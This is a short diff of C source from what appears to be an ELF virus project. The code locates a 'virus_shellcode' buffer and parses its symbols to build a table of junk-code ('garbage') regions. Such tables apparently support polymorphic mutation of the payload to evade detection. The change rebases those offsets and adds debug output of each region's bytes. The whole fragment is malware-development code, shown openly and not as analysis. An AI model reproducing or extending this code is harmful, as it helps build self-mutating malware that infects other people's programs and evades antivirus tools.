@@ -40,11 +40,14 @@ int get_virus_info(char **v, size_t *l, size_t *c_off, size_t *c_len){
 	return TRUE;
 }
 
-#define GB_START ".garb_start"
-#define GB_END ".garb_end"
+#define STR_GB_START ".garb_start"
+#define STR_GB_END ".garb_end"
 
 int set_garbage_infos(){
+	int64_t bin_start_off;
 	char **names = NULL;
+	
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_start", &bin_start_off);
 	
 	int64_t off_gt_len;
 	elf_off_symbol(virus_shellcode, virus_shellcode_len, "garbage_table_len", &off_gt_len);
@@ -68,12 +71,20 @@ int set_garbage_infos(){
     for (size_t i = 0; i < n; i++) {
         //println(strs + sym[i].st_name);
 		//WARNING: this algo may not work on other the linker
-        if (startswith(strs + sym[i].st_name, GB_START)){
-			if (!(i+1 < n && startswith(strs + sym[i+1].st_name, GB_END) &&
-				str_equal(strs + sym[i].st_name + slen(GB_START),
-							 strs + sym[i+1].st_name + slen(GB_END))))
+        if (startswith(strs + sym[i].st_name, STR_GB_START)){
+			if (!(i+1 < n && startswith(strs + sym[i+1].st_name, STR_GB_END) &&
+				str_equal(strs + sym[i].st_name + slen(STR_GB_START),
+							 strs + sym[i+1].st_name + slen(STR_GB_END))))
 				return FALSE;
-			gt[x] = (Garbage){sym[i].st_value, sym[i+1].st_value-sym[i].st_value};
+			gt[x] = (Garbage){sym[i].st_value - bin_start_off, sym[i+1].st_value-sym[i].st_value};
+			printnb(sym[i+1].st_value-sym[i].st_value);
+			print(" : ");
+			char *p = (virus_shellcode + gt[x].off + bin_start_off);
+			for (int j = 0 ; j < gt[x].len; j++){
+				printnb((unsigned char)p[j]);
+				print(" ");
+			}
+			println("ok");
 			//skip next
 			i += 1;
         }
